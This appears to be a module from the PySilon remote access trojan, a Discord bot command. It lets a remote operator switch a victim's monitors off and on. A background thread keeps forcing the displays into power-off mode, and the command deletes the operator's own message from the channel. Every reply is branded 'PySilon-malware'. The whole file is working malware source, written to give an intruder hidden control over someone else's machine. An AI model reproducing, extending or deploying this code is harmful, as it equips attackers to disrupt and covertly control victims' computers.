import monitorcontrol
import threading

global monitors_off
monitors_off = False

@client.command(name="monitors")
async def monitor_control(ctx, state=None):
    global monitors_off
    await ctx.message.delete()
    if state == "off":
        if not monitors_off:
            monitors_off = True
            def monitor_off():
                while monitors_off:
                    for monitor in monitorcontrol.get_monitors():
                        with monitor:
                            monitor.set_power_mode(4)

            threading.Thread(target=monitor_off).start()

            embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

        else:
            embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)

    elif state == "on":
        if monitors_off:
            for monitor in monitorcontrol.get_monitors():
                with monitor:
                    monitor.set_power_mode(1)

            embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            monitors_off = False
        else: 
            embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Syntax: .monitors <on / off>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)